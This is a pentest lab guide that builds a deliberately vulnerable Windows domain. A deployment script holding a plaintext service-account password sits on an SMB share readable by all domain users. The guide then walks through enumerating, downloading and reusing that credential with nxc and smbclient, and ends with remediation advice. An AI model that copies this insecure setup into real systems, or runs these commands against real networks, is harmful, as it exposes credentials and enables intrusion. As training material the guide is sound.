# Vulnerability 04 - Credential Exposure Through SMB

## Objective
Model a common internal-pentest finding: ordinary domain users can read a deployment share containing plaintext service-account credentials.

## Attack path

```text
jwilson
   |
SMB enumeration
   v
SRV01\IT-Deploy$
   |
read access
   v
deployment.ps1
   |
plaintext credential
   v
svc_backup
   |
local administrator
   v
SRV01
```

## Configure service account on DC01

```powershell
Set-ADAccountPassword `
  -Identity "svc_backup" `
  -Reset `
  -NewPassword (ConvertTo-SecureString "Backup2025!" -AsPlainText -Force)

Set-ADUser svc_backup -PasswordNeverExpires $true
```

On SRV01:

```powershell
Add-LocalGroupMember `
  -Group "Administrators" `
  -Member "HZNLAB\svc_backup"
```

## Create vulnerable deployment share

```powershell
New-Item -ItemType Directory -Path C:\IT-Deploy -Force

@'
# Legacy backup-agent deployment
# TODO: migrate this to managed service credentials

$BackupServer = "SRV01.hznlab.local"
$BackupUser   = "HZNLAB\svc_backup"
$BackupPass   = "Backup2025!"

Write-Host "Installing HZN Backup Agent..."
'@ | Set-Content C:\IT-Deploy\deployment.ps1

icacls C:\IT-Deploy /grant "HZNLAB\Domain Users:(OI)(CI)RX"

New-SmbShare `
  -Name "IT-Deploy$" `
  -Path "C:\IT-Deploy" `
  -ReadAccess "HZNLAB\Domain Users"
```

## Enumerate from Kali

```bash
nxc smb 10.10.10.20 \
  -u jwilson \
  -p 'HznLab2026!' \
  --shares
```

Connect:

```bash
smbclient '//10.10.10.20/IT-Deploy$' \
  -U 'HZNLAB\jwilson%HznLab2026!'
```

Inside:

```text
ls
get deployment.ps1
exit
```

Read:

```bash
cat deployment.ps1
```

## Validate impact

```bash
nxc smb 10.10.10.10 10.10.10.20 10.10.10.21 \
  -u svc_backup \
  -p 'Backup2025!'
```

Expected:

```text
SRV01 -> (Pwn3d!)
DC01  -> authenticated, not admin
WS01  -> authenticated, not admin
```

## Remediation
Do not store plaintext secrets in scripts. Restrict deployment shares, rotate exposed credentials, prefer managed identities/gMSAs where practical, and minimize service-account privileges.
